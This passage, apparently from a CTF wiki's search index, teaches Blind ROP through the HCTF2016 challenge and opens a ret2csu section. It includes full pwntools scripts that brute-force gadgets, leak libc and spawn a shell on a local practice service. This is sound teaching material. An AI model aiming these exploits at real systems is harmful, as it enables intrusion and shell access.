chain\uff0c\u540c\u65f6\u4f7f\u5f97\u6bcf\u4e2arop\u5bf9\u5e94\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u4e0d\u4e00\u6837\n\n\n\u540c\u65f6\u6253\u5f00\u591a\u4e2a\u8fde\u63a5\uff0c\u5e76\u4e14\u6211\u4eec\u4f7f\u7528\u76f8\u5bf9\u8f83\u9ad8\u7684\u6570\u503c\u6765\u8bd5\u4e00\u8bd5\u3002\n\n\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\n\n\n\n\nlinux\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4e00\u4e2a\u8fdb\u7a0b\u6700\u591a\u53ea\u80fd\u6253\u5f001024\u4e2a\u6587\u4ef6\u63cf\u8ff0\u7b26\u3002\n\n\nposix\u6807\u51c6\u6bcf\u6b21\u7533\u8bf7\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u6570\u503c\u603b\u662f\u5f53\u524d\u6700\u5c0f\u53ef\u7528\u6570\u503c\u3002\n\n\n\n\n\u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u9009\u62e9\u5bfb\u627eputs\u51fd\u6570\u3002\n\n\n\u5bfb\u627eputs@plt\n\n\n\u5bfb\u627eputs\u51fd\u6570(\u8fd9\u91cc\u6211\u4eec\u5bfb\u627e\u7684\u662f plt)\uff0c\u6211\u4eec\u81ea\u7136\u9700\u8981\u63a7\u5236rdi\u53c2\u6570\uff0c\u5728\u4e0a\u9762\uff0c\u6211\u4eec\u5df2\u7ecf\u627e\u5230\u4e86brop gadget\u3002\u90a3\u4e48\uff0c\u6211\u4eec\u6839\u636ebrop gadget\u504f\u79fb9\u53ef\u4ee5\u5f97\u5230\u76f8\u5e94\u7684gadgets\uff08\u7531ret2libc_csu_init\u4e2d\u540e\u7eed\u53ef\u5f97\uff09\u3002\u540c\u65f6\u5728\u7a0b\u5e8f\u8fd8\u6ca1\u6709\u5f00\u542fPIE\u4fdd\u62a4\u7684\u60c5\u51b5\u4e0b\uff0c0x400000\u5904\u4e3aELF\u6587\u4ef6\u7684\u5934\u90e8\uff0c\u5176\u5185\u5bb9\u4e3a\\x7fELF\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u8fd9\u4e2a\u6765\u8fdb\u884c\u5224\u65ad\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5176payload\u5982\u4e0b\n\n\npayload = \nA\n*length +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)\n\n\n\n\n\u653b\u51fb\u603b\u7ed3\n\n\n\u6b64\u65f6\uff0c\u653b\u51fb\u8005\u5df2\u7ecf\u53ef\u4ee5\u63a7\u5236\u8f93\u51fa\u51fd\u6570\u4e86\uff0c\u90a3\u4e48\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u8f93\u51fa.text\u6bb5\u66f4\u591a\u7684\u5185\u5bb9\u4ee5\u4fbf\u4e8e\u6765\u627e\u5230\u66f4\u591a\u5408\u9002gadgets\u3002\u540c\u65f6\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u627e\u5230\u4e00\u4e9b\u5176\u5b83\u51fd\u6570\uff0c\u5982dup2\u6216\u8005execve\u51fd\u6570\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u653b\u51fb\u8005\u6b64\u65f6\u4f1a\u53bb\u505a\u4e0b\u4e8b\u60c5\n\n\n\n\n\u5c06socket\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u8f93\u5165\u8f93\u51fa\n\n\n\u5bfb\u627e\u201c/bin/sh\u201d\u7684\u5730\u5740\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6700\u597d\u662f\u627e\u5230\u4e00\u5757\u53ef\u5199\u7684\u5185\u5b58\uff0c\u5229\u7528write\u51fd\u6570\u5c06\u8fd9\u4e2a\u5b57\u7b26\u4e32\u5199\u5230\u76f8\u5e94\u7684\u5730\u5740\u3002\n\n\n\u6267\u884cexecve\u83b7\u53d6shell\uff0c\u83b7\u53d6execve\u4e0d\u4e00\u5b9a\u5728plt\u8868\u4e2d\uff0c\u6b64\u65f6\u653b\u51fb\u8005\u5c31\u9700\u8981\u60f3\u529e\u6cd5\u6267\u884c\u7cfb\u7edf\u8c03\u7528\u4e86\u3002\n\n\n\n\n\u4f8b\u5b50\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5HCTF2016\u7684\u51fa\u9898\u4eba\u5931\u8e2a\u4e86\u4e3a\u4f8b\uff0c\u76f8\u5173\u7684\u90e8\u7f72\u6587\u4ef6\u90fd\u653e\u5728\u4e86example\u6587\u4ef6\u5939\u4e0b\u7684\u5bf9\u5e94\u76ee\u5f55\u4e0b\u3002\u57fa\u672c\u601d\u8def\u5982\u4e0b\n\n\n\u786e\u5b9a\u6808\u6ea2\u51fa\u957f\u5ea6\n\n\ndef\n \ngetbufferflow_length\n():\n\n    \ni\n \n=\n \n1\n\n    \nwhile\n \n1\n:\n\n        \ntry\n:\n\n            \nsh\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n9999\n)\n\n            \nsh\n.\nrecvuntil\n(\nWelCome my friend,Do you know password?\n\\n\n)\n\n            \nsh\n.\nsend\n(\ni\n \n*\n \na\n)\n\n            \noutput\n \n=\n \nsh\n.\nrecv\n()\n\n            \nsh\n.\nclose\n()\n\n            \nif\n \nnot\n \noutput\n.\nstartswith\n(\nNo password\n):\n\n                \nreturn\n \ni\n \n-\n \n1\n\n            \nelse\n:\n\n                \ni\n \n+=\n \n1\n\n        \nexcept\n \nEOFError\n:\n\n            \nsh\n.\nclose\n()\n\n            \nreturn\n \ni\n \n-\n \n1\n\n\n\n\n\n\u6839\u636e\u4e0a\u9762\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\uff0c\u6808\u6ea2\u51fa\u7684\u957f\u5ea6\u4e3a72\u3002\u540c\u65f6\uff0c\u6839\u636e\u56de\u663e\u4fe1\u606f\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u5e76\u6ca1\u6709\u5f00\u542fcanary\u4fdd\u62a4\uff0c\u5426\u5219\uff0c\u5c31\u4f1a\u6709\u76f8\u5e94\u7684\u62a5\u9519\u5185\u5bb9\u3002\u6240\u4ee5\u6211\u4eec\u4e0d\u9700\u8981\u6267\u884cstack reading\u3002\n\n\n\u5bfb\u627e stop gadgets\n\n\n\u5bfb\u627e\u8fc7\u7a0b\u5982\u4e0b\n\n\ndef\n \nget_stop_addr\n(\nlength\n):\n\n    \naddr\n \n=\n \n0x400000\n\n    \nwhile\n \n1\n:\n\n        \ntry\n:\n\n            \nsh\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n9999\n)\n\n            \nsh\n.\nrecvuntil\n(\npassword?\n\\n\n)\n\n            \npayload\n \n=\n \na\n \n*\n \nlength\n \n+\n \np64\n(\naddr\n)\n\n            \nsh\n.\nsendline\n(\npayload\n)\n\n            \nsh\n.\nrecv\n()\n\n            \nsh\n.\nclose\n()\n\n            \nprint\n \none success addr: 0x\n%x\n \n%\n \n(\naddr\n)\n\n            \nreturn\n \naddr\n\n        \nexcept\n \nException\n:\n\n            \naddr\n \n+=\n \n1\n\n            \nsh\n.\nclose\n()\n\n\n\n\n\n\u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u5c1d\u8bd564\u4f4d\u7a0b\u5e8f\u6ca1\u6709\u5f00\u542fPIE\u7684\u60c5\u51b5\uff0c\u56e0\u4e3a\u4e00\u822c\u662f\u8fd9\u4e2a\u6837\u5b50\u7684\uff0c\uff0c\uff0c\u5982\u679c\u5f00\u542f\u4e86\uff0c\uff0c\u90a3\u5c31\u6309\u7167\u5f00\u542f\u4e86\u7684\u65b9\u6cd5\u505a\uff0c\uff0c\u7ed3\u679c\u53d1\u73b0\u4e86\u4e0d\u5c11\uff0c\uff0c\u6211\u9009\u62e9\u4e86\u4e00\u4e2a\u8c8c\u4f3c\u8fd4\u56de\u5230\u6e90\u7a0b\u5e8f\u4e2d\u7684\u5730\u5740\n\n\none success stop gadget addr: 0x4006b6\n\n\n\n\n\u8bc6\u522bbrop gadgets\n\n\n\u4e0b\u9762\uff0c\u6211\u4eec\u6839\u636e\u4e0a\u9762\u4ecb\u7ecd\u7684\u539f\u7406\u6765\u5f97\u5230\u5bf9\u5e94\u7684brop gadgets\u5730\u5740\u3002\u6784\u9020\u5982\u4e0b\uff0cget_brop_gadget\u662f\u4e3a\u4e86\u5f97\u5230\u53ef\u80fd\u7684brop gadget\uff0c\u540e\u9762\u7684check_brop_gadget\u662f\u4e3a\u4e86\u68c0\u67e5\u3002\n\n\ndef\n \nget_brop_gadget\n(\nlength\n,\n \nstop_gadget\n,\n \naddr\n):\n\n    \ntry\n:\n\n        \nsh\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n9999\n)\n\n        \nsh\n.\nrecvuntil\n(\npassword?\n\\n\n)\n\n        \npayload\n \n=\n \na\n \n*\n \nlength\n \n+\n \np64\n(\naddr\n)\n \n+\n \np64\n(\n0\n)\n \n*\n \n6\n \n+\n \np64\n(\n\n            \nstop_gadget\n)\n \n+\n \np64\n(\n0\n)\n \n*\n \n10\n\n        \nsh\n.\nsendline\n(\npayload\n)\n\n        \ncontent\n \n=\n \nsh\n.\nrecv\n()\n\n        \nsh\n.\nclose\n()\n\n        \nprint\n \ncontent\n\n        \n# stop gadget returns memory\n\n        \nif\n \nnot\n \ncontent\n.\nstartswith\n(\nWelCome\n):\n\n            \nreturn\n \nFalse\n\n        \nreturn\n \nTrue\n\n    \nexcept\n \nException\n:\n\n        \nsh\n.\nclose\n()\n\n        \nreturn\n \nFalse\n\n\n\n\ndef\n \ncheck_brop_gadget\n(\nlength\n,\n \naddr\n):\n\n    \ntry\n:\n\n        \nsh\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n9999\n)\n\n        \nsh\n.\nrecvuntil\n(\npassword?\n\\n\n)\n\n        \npayload\n \n=\n \na\n \n*\n \nlength\n \n+\n \np64\n(\naddr\n)\n \n+\n \na\n \n*\n \n8\n \n*\n \n10\n\n        \nsh\n.\nsendline\n(\npayload\n)\n\n        \ncontent\n \n=\n \nsh\n.\nrecv\n()\n\n        \nsh\n.\nclose\n()\n\n        \nreturn\n \nFalse\n\n    \nexcept\n \nException\n:\n\n        \nsh\n.\nclose\n()\n\n        \nreturn\n \nTrue\n\n\n\n\n##length = getbufferflow_length()\n\n\nlength\n \n=\n \n72\n\n\n##get_stop_addr(length)\n\n\nstop_gadget\n \n=\n \n0x4006b6\n\n\naddr\n \n=\n \n0x400740\n\n\nwhile\n \n1\n:\n\n    \nprint\n \nhex\n(\naddr\n)\n\n    \nif\n \nget_brop_gadget\n(\nlength\n,\n \nstop_gadget\n,\n \naddr\n):\n\n        \nprint\n \npossible brop gadget: 0x\n%x\n \n%\n \naddr\n\n        \nif\n \ncheck_brop_gadget\n(\nlength\n,\n \naddr\n):\n\n            \nprint\n \nsuccess brop gadget: 0x\n%x\n \n%\n \naddr\n\n            \nbreak\n\n    \naddr\n \n+=\n \n1\n\n\n\n\n\n\u8fd9\u6837\uff0c\u6211\u4eec\u57fa\u672c\u5f97\u5230\u4e86brop\u7684gadgets\u5730\u57400x4007ba\n\n\n\u786e\u5b9aputs@plt\u5730\u5740\n\n\n\u6839\u636e\u4e0a\u9762\uff0c\u6240\u8bf4\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0bpayload\u6765\u8fdb\u884c\u83b7\u53d6\n\n\npayload = \nA\n*72 +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)\n\n\n\n\n\u5177\u4f53\u51fd\u6570\u5982\u4e0b\n\n\ndef\n \nget_puts_addr\n(\nlength\n,\n \nrdi_ret\n,\n \nstop_gadget\n):\n\n    \naddr\n \n=\n \n0x400000\n\n    \nwhile\n \n1\n:\n\n        \nprint\n \nhex\n(\naddr\n)\n\n        \nsh\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n9999\n)\n\n        \nsh\n.\nrecvuntil\n(\npassword?\n\\n\n)\n\n        \npayload\n \n=\n \nA\n \n*\n \nlength\n \n+\n \np64\n(\nrdi_ret\n)\n \n+\n \np64\n(\n0x400000\n)\n \n+\n \np64\n(\n\n            \naddr\n)\n \n+\n \np64\n(\nstop_gadget\n)\n\n        \nsh\n.\nsendline\n(\npayload\n)\n\n        \ntry\n:\n\n            \ncontent\n \n=\n \nsh\n.\nrecv\n()\n\n            \nif\n \ncontent\n.\nstartswith\n(\n\\x7f\nELF\n):\n\n                \nprint\n \nfind puts@plt addr: 0x\n%x\n \n%\n \naddr\n\n                \nreturn\n \naddr\n\n            \nsh\n.\nclose\n()\n\n            \naddr\n \n+=\n \n1\n\n        \nexcept\n \nException\n:\n\n            \nsh\n.\nclose\n()\n\n            \naddr\n \n+=\n \n1\n\n\n\n\n\n\u6700\u540e\u6839\u636eplt\u7684\u7ed3\u6784\uff0c\u9009\u62e90x400560\u4f5c\u4e3aputs@plt\n\n\n\u6cc4\u9732puts@got\u5730\u5740\n\n\n\u5728\u6211\u4eec\u53ef\u4ee5\u8c03\u7528puts\u51fd\u6570\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u6cc4\u9732puts\u51fd\u6570\u7684\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6libc\u7248\u672c\uff0c\u4ece\u800c\u83b7\u53d6\u76f8\u5173\u7684system\u51fd\u6570\u5730\u5740\u4e0e/bin/sh\u5730\u5740\uff0c\u4ece\u800c\u83b7\u53d6shell\u3002\u6211\u4eec\u4ece0x400000\u5f00\u59cb\u6cc4\u97320x1000\u4e2a\u5b57\u8282\uff0c\u8fd9\u5df2\u7ecf\u8db3\u591f\u5305\u542b\u7a0b\u5e8f\u7684plt\u90e8\u5206\u4e86\u3002\u4ee3\u7801\u5982\u4e0b\n\n\ndef\n \nleak\n(\nlength\n,\n \nrdi_ret\n,\n \nputs_plt\n,\n \nleak_addr\n,\n \nstop_gadget\n):\n\n    \nsh\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n9999\n)\n\n    \npayload\n \n=\n \na\n \n*\n \nlength\n \n+\n \np64\n(\nrdi_ret\n)\n \n+\n \np64\n(\nleak_addr\n)\n \n+\n \np64\n(\n\n        \nputs_plt\n)\n \n+\n \np64\n(\nstop_gadget\n)\n\n    \nsh\n.\nrecvuntil\n(\npassword?\n\\n\n)\n\n    \nsh\n.\nsendline\n(\npayload\n)\n\n    \ntry\n:\n\n        \ndata\n \n=\n \nsh\n.\nrecv\n()\n\n        \nsh\n.\nclose\n()\n\n        \ntry\n:\n\n            \ndata\n \n=\n \ndata\n[:\ndata\n.\nindex\n(\n\\n\nWelCome\n)]\n\n        \nexcept\n \nException\n:\n\n            \ndata\n \n=\n \ndata\n\n        \nif\n \ndata\n \n==\n \n:\n\n            \ndata\n \n=\n \n\\x00\n\n        \nreturn\n \ndata\n\n    \nexcept\n \nException\n:\n\n        \nsh\n.\nclose\n()\n\n        \nreturn\n \nNone\n\n\n\n\n##length = getbufferflow_length()\n\n\nlength\n \n=\n \n72\n\n\n##stop_gadget = get_stop_addr(length)\n\n\nstop_gadget\n \n=\n \n0x4006b6\n\n\n##brop_gadget = find_brop_gadget(length,stop_gadget)\n\n\nbrop_gadget\n \n=\n \n0x4007ba\n\n\nrdi_ret\n \n=\n \nbrop_gadget\n \n+\n \n9\n\n\n##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)\n\n\nputs_plt\n \n=\n \n0x400560\n\n\naddr\n \n=\n \n0x400000\n\n\nresult\n \n=\n \n\n\nwhile\n \naddr\n \n \n0x401000\n:\n\n    \nprint\n \nhex\n(\naddr\n)\n\n    \ndata\n \n=\n \nleak\n(\nlength\n,\n \nrdi_ret\n,\n \nputs_plt\n,\n \naddr\n,\n \nstop_gadget\n)\n\n    \nif\n \ndata\n \nis\n \nNone\n:\n\n        \ncontinue\n\n    \nelse\n:\n\n        \nresult\n \n+=\n \ndata\n\n    \naddr\n \n+=\n \nlen\n(\ndata\n)\n\n\nwith\n \nopen\n(\ncode\n,\n \nwb\n)\n \nas\n \nf\n:\n\n    \nf\n.\nwrite\n(\nresult\n)\n\n\n\n\n\n\u6700\u540e\uff0c\u6211\u4eec\u5c06\u6cc4\u9732\u7684\u5185\u5bb9\u5199\u5230\u6587\u4ef6\u91cc\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\u5982\u679c\u6cc4\u9732\u51fa\u6765\u7684\u662f\u201c\u201d,\u90a3\u8bf4\u660e\u6211\u4eec\u9047\u5230\u4e86'\\x00'\uff0c\u56e0\u4e3aputs\u662f\u8f93\u51fa\u5b57\u7b26\u4e32\uff0c\u5b57\u7b26\u4e32\u662f\u4ee5'\\x00'\u4e3a\u7ec8\u6b62\u7b26\u7684\u3002\u4e4b\u540e\u5229\u7528ida\u6253\u5f00binary\u6a21\u5f0f\uff0c\u9996\u5148\u5728edit-\nsegments-\nrebase program \u5c06\u7a0b\u5e8f\u7684\u57fa\u5730\u5740\u6539\u4e3a0x400000\uff0c\u7136\u540e\u627e\u5230\u504f\u79fb0x560\u5904\uff0c\u5982\u4e0b\n\n\nseg000:\n0000000000400560\n                 \ndb\n \n0\nFFh\n\n\nseg000:\n0000000000400561\n                 \ndb\n  \n25\nh\n \n; %\n\n\nseg000\n:\n0000000000400562\n                 \ndb\n \n0\nB2h\n \n; \n\n\nseg000\n:\n0000000000400563\n                 \ndb\n  \n0\nAh\n\n\nseg000:\n0000000000400564\n                 \ndb\n  \n20\nh\n\n\nseg000:\n0000000000400565\n                 \ndb\n    \n0\n\n\n\n\n\n\u7136\u540e\u6309\u4e0bc,\u5c06\u6b64\u5904\u7684\u6570\u636e\u8f6c\u6362\u4e3a\u6c47\u7f16\u6307\u4ee4\uff0c\u5982\u4e0b\n\n\nseg000:\n0000000000400560\n \n; ---------------------------------------------------------------------------\n\n\nseg000:\n0000000000400560\n                 \njmp\n     \nqword\n \nptr\n \ncs\n:\n601018\nh\n\n\nseg000:\n0000000000400566\n \n; ---------------------------------------------------------------------------\n\n\nseg000:\n0000000000400566\n                 \npush\n    \n0\n\n\nseg000:\n000000000040056\nB\n                 \njmp\n     \nloc_400550\n\n\nseg000:\n000000000040056\nB\n \n; ---------------------------------------------------------------------------\n\n\n\n\n\n\u8fd9\u8bf4\u660e\uff0cputs@got\u7684\u5730\u5740\u4e3a0x601018\u3002\n\n\n\u7a0b\u5e8f\u5229\u7528\n\n\n##length = getbufferflow_length()\n\n\nlength\n \n=\n \n72\n\n\n##stop_gadget = get_stop_addr(length)\n\n\nstop_gadget\n \n=\n \n0x4006b6\n\n\n##brop_gadget = find_brop_gadget(length,stop_gadget)\n\n\nbrop_gadget\n \n=\n \n0x4007ba\n\n\nrdi_ret\n \n=\n \nbrop_gadget\n \n+\n \n9\n\n\n##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)\n\n\nputs_plt\n \n=\n \n0x400560\n\n\n##leakfunction(length, rdi_ret, puts_plt, stop_gadget)\n\n\nputs_got\n \n=\n \n0x601018\n\n\n\nsh\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n9999\n)\n\n\nsh\n.\nrecvuntil\n(\npassword?\n\\n\n)\n\n\npayload\n \n=\n \na\n \n*\n \nlength\n \n+\n \np64\n(\nrdi_ret\n)\n \n+\n \np64\n(\nputs_got\n)\n \n+\n \np64\n(\nputs_plt\n)\n \n+\n \np64\n(\n\n    \nstop_gadget\n)\n\n\nsh\n.\nsendline\n(\npayload\n)\n\n\ndata\n \n=\n \nsh\n.\nrecvuntil\n(\n\\n\nWelCome\n,\n \ndrop\n=\nTrue\n)\n\n\nputs_addr\n \n=\n \nu64\n(\ndata\n.\nljust\n(\n8\n,\n \n\\x00\n))\n\n\nlibc\n \n=\n \nLibcSearcher\n(\nputs\n,\n \nputs_addr\n)\n\n\nlibc_base\n \n=\n \nputs_addr\n \n-\n \nlibc\n.\ndump\n(\nputs\n)\n\n\nsystem_addr\n \n=\n \nlibc_base\n \n+\n \nlibc\n.\ndump\n(\nsystem\n)\n\n\nbinsh_addr\n \n=\n \nlibc_base\n \n+\n \nlibc\n.\ndump\n(\nstr_bin_sh\n)\n\n\npayload\n \n=\n \na\n \n*\n \nlength\n \n+\n \np64\n(\nrdi_ret\n)\n \n+\n \np64\n(\nbinsh_addr\n)\n \n+\n \np64\n(\n\n    \nsystem_addr\n)\n \n+\n \np64\n(\nstop_gadget\n)\n\n\nsh\n.\nsendline\n(\npayload\n)\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u53c2\u8003\u9605\u8bfb\n\n\n\n\nhttp://ytliu.info/blog/2014/09/28/blind-return-oriented-programming-brop-attack-gong-ji-yuan-li/\n\n\nhttp://bobao.360.cn/learning/detail/3694.html\n\n\nhttp://o0xmuhe.me/2017/01/22/Have-fun-with-Blind-ROP/", 
            "title": "\u4e2d\u7ea7 ROP"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#rop", 
            "text": "\u4e2d\u7ea7ROP\u4e3b\u8981\u662f\u4f7f\u7528\u4e86\u4e00\u4e9b\u6bd4\u8f83\u5de7\u5999\u7684Gadgets\u3002", 
            "title": "\u4e2d\u7ea7ROP"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#ret2__libc_scu_init", 
            "text": "", 
            "title": "ret2__libc_scu_init"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_1", 
            "text": "\u572864\u4f4d\u7a0b\u5e8f\u4e2d\uff0c\u51fd\u6570\u7684\u524d6\u4e2a\u53c2\u6570\u662f\u901a\u8fc7\u5bc4\u5b58\u5668\u4f20\u9012\u7684\uff0c\u4f46\u662f\u5927\u591a\u6570\u65f6\u5019\uff0c\u6211\u4eec\u5f88\u96be\u627e\u5230\u6bcf\u4e00\u4e2a\u5bc4\u5b58\u5668\u5bf9\u5e94\u7684gadgets\u3002 \u8fd9\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528x64\u4e0b\u7684__libc_scu_init\u4e2d\u7684gadgets\u3002\u8fd9\u4e2a\u51fd\u6570\u662f\u7528\u6765\u5bf9libc\u8fdb\u884c\u521d\u59cb\u5316\u64cd\u4f5c\u7684\uff0c\u800c\u4e00\u822c\u7684\u7a0b\u5e8f\u90fd\u4f1a\u8c03\u7528libc\u51fd\u6570\uff0c\u6240\u4ee5\u8fd9\u4e2a\u51fd\u6570\u4e00\u5b9a\u4f1a\u5b58\u5728\u3002\u6211\u4eec\u5148\u6765\u770b\u4e00\u4e0b\u8fd9\u4e2a\u51fd\u6570(\u5f53\u7136\uff0c\u4e0d\u540c\u7248\u672c\u7684\u8fd9\u4e2a\u51fd\u6570\u6709\u4e00\u5b9a\u7684\u533a\u522b)  .text: 00000000004005 C0   ; void _libc_csu_init(void)  .text : 00000000004005 C0                   public   __libc_csu_init  .text: 00000000004005 C0   __libc_csu_init   proc   near                 ; DATA XREF: _start+16\u0018o  .text : 00000000004005 C0                   push      r15  .text: 00000000004005 C2                   push      r14  .text: 00000000004005 C4                   mov       r15d ,   edi  .text: 00000000004005 C7                   push      r13  .text: 00000000004005 C9                   push      r12  .text: 00000000004005 CB                   lea       r12 ,   __frame_dummy_init_array_entry  .text: 00000000004005 D2                   push      rbp  .text: 00000000004005 D3                   lea       rbp ,   __do_global_dtors_aux_fini_array_entry  .text: 00000000004005 DA                   push      rbx  .text: 00000000004005 DB                   mov       r14 ,   rsi  .text: 00000000004005 DE                   mov       r13 ,   rdx  .text: 00000000004005 E1                   sub       rbp ,   r12  .text: 00000000004005 E4                   sub       rsp ,   8  .text: 00000000004005 E8                   sar       rbp ,   3  .text: 00000000004005 EC                   call      _init_proc  .text: 00000000004005 F1                   test      rbp ,   rbp  .text: 00000000004005 F4                   jz        short   loc_400616  .text: 00000000004005 F6                   xor       ebx ,   ebx  .text: 00000000004005 F8                   nop       dword   ptr   [ rax + rax + 00000000 h ]  .text: 0000000000400600  .text: 0000000000400600   loc_400600:                               ; CODE XREF: __libc_csu_init+54\u0019j  .text: 0000000000400600                   mov       rdx ,   r13  .text: 0000000000400603                   mov       rsi ,   r14  .text: 0000000000400606                   mov       edi ,   r15d  .text: 0000000000400609                   call      qword   ptr   [ r12 + rbx * 8 ]  .text: 000000000040060 D                   add       rbx ,   1  .text: 0000000000400611                   cmp       rbx ,   rbp  .text: 0000000000400614                   jnz       short   loc_400600  .text: 0000000000400616  .text: 0000000000400616   loc_400616:                               ; CODE XREF: __libc_csu_init+34\u0018j  .text: 0000000000400616                   add       rsp ,   8  .text: 000000000040061 A                   pop       rbx  .text: 000000000040061 B                   pop       rbp  .text: 000000000040061 C                   pop       r12  .text: 000000000040061 E                   pop       r13  .text: 0000000000400620                   pop       r14  .text: 0000000000400622                   pop       r15  .text: 0000000000400624                   retn  .text: 0000000000400624   __libc_csu_init   endp   \u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u4ee5\u4e0b\u51e0\u70b9   \u4ece0x000000000040061A\u4e00\u76f4\u5230\u7ed3\u5c3e\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6808\u6ea2\u51fa\u6784\u9020\u6808\u4e0a\u6570\u636e\u6765\u63a7\u5236rbx,rbp,r12,r13,r14,r15\u5bc4\u5b58\u5668\u7684\u6570\u636e\u3002  \u4ece0x0000000000400600\u52300x0000000000400609\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06r13\u8d4b\u7ed9rdx,\u5c06r14\u8d4b\u7ed9rsi\uff0c\u5c06r15d\u8d4b\u7ed9edi\uff08\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u867d\u7136\u8fd9\u91cc\u8d4b\u7ed9\u7684\u662fedi\uff0c \u4f46\u5176\u5b9e\u6b64\u65f6rdi\u7684\u9ad832\u4f4d\u5bc4\u5b58\u5668\u503c\u4e3a0\uff08\u81ea\u884c\u8c03\u8bd5\uff09 \uff0c\u6240\u4ee5\u5176\u5b9e\u6211\u4eec\u53ef\u4ee5\u63a7\u5236rdi\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u53ea\u4e0d\u8fc7\u53ea\u80fd\u63a7\u5236\u4f4e32\u4f4d\uff09\uff0c\u800c\u8fd9\u4e09\u4e2a\u5bc4\u5b58\u5668\uff0c\u4e5f\u662fx64\u51fd\u6570\u8c03\u7528\u4e2d\u4f20\u9012\u7684\u524d\u4e09\u4e2a\u5bc4\u5b58\u5668\u3002\u6b64\u5916\uff0c\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u5408\u7406\u5730\u63a7\u5236r12\u4e0erbx\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u8c03\u7528\u6211\u4eec\u60f3\u8981\u8c03\u7528\u7684\u51fd\u6570\u3002\u6bd4\u5982\u8bf4\u6211\u4eec\u53ef\u4ee5\u63a7\u5236rbx\u4e3a0\uff0cr12\u4e3a\u5b58\u50a8\u6211\u4eec\u60f3\u8981\u8c03\u7528\u7684\u51fd\u6570\u7684\u5730\u5740\u3002  \u4ece0x000000000040060D\u52300x0000000000400614\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236rbx\u4e0erbp\u7684\u4e4b\u95f4\u7684\u5173\u7cfb\u4e3arbx+1=rbp\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u4e0d\u4f1a\u6267\u884cloc_400600\uff0c\u8fdb\u800c\u53ef\u4ee5\u7ee7\u7eed\u6267\u884c\u4e0b\u9762\u7684\u6c47\u7f16\u7a0b\u5e8f\u3002\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u7684\u8bbe\u7f6erbx=0\uff0crbp=1\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/#_2", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee5\u84b8\u7c73\u7684\u4e00\u6b65\u4e00\u6b65\u5b66ROP\u4e4blinux_x64\u7bc7\u4e2dlevel5\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u9996\u5148\u68c0\u67e5\u7a0b\u5e8f\u7684\u5b89\u5168\u4fdd\u62a4  \u279c  ret2__libc_csu_init git: ( iromise )  \u2717 checksec level5   \n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x400000 )   \u7a0b\u5e8f\u4e3a64\u4f4d\uff0c\u5f00\u542f\u4e86\u5806\u6808\u4e0d\u53ef\u6267\u884c\u4fdd\u62a4\u3002  \u5176\u6b21\uff0c\u5bfb\u627e\u7a0b\u5e8f\u7684\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e2d\u6709\u4e00\u4e2a\u7b80\u5355\u7684\u6808\u6ea2\u51fa  ssize_t   vulnerable_function ()  { \n   char   buf ;   // [sp+0h] [bp-80h]@1 \n\n   return   read ( 0 ,   buf ,   0x200uLL );  }   \u7b80\u5355\u6d4f\u89c8\u4e0b\u7a0b\u5e8f\uff0c\u53d1\u73b0\u7a0b\u5e8f\u4e2d\u65e2\u6ca1\u6709system\u51fd\u6570\u5730\u5740\uff0c\u4e5f\u6ca1\u6709/bin/sh\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u4e24\u8005\u90fd\u9700\u8981\u6211\u4eec\u81ea\u5df1\u53bb\u6784\u9020\u4e86\u3002  